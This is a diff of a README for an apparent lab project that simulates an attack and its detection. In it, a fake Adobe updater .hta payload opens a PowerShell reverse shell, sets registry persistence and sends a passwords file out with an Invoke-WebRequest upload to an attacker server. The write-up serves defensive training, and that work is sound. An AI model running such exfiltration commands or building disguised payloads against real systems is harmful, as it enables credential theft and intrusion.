@@ -61,9 +61,11 @@ The project directory is organized as follows:
 1. **User executes** the `.hta` payload mimicking a legitimate Adobe updater.
 2. Payload runs an embedded VBScript, which:
  - **Launches a PowerShell reverse shell**
- - **Adds a `Run` registry key for persistence**
+ - **Adds a `Run` key for persistence**
  - **Displays a fake dowonloading progress bar window to distract the user**
 3. **Reverse shell is caught** by the attacker's Netcat listener.
+ - **The attacker navigates the file system** 
+ - **A `Password.txt` file is found and uploaded**
 
 --- 
 
@@ -74,7 +76,6 @@ After simulating the attack, I pivoted to a defender’s perspective and analyze
 - **Autoruns:** Detected persistence via Registry Run key  
 - **Process Explorer:** Tracked the PowerShell child process  
 - **Wireshark:** Captured reverse shell TCP traffic  
-- **File analysis:** Verified dropped artifacts and decoy payloads  
 
 #### The goal was to demonstrate how a SOC analyst might uncover and triage a stealthy but simple attack.
 ---
@@ -184,7 +185,7 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -
 
 
 
-*In Figure 12, we can see in the second terminal it's running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there is only one files in the directory.*<br>
+*In Figure 12, we can see in the second terminal it's running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there is only the Python script in the directory.*<br>
 <br><sub>(Figure 12)</sub><br>
 <img src="analysis/screenshots_v1/Figure_11.png" alt="PowerShell Exfiltration Command Reference" width="75%"><br>
 
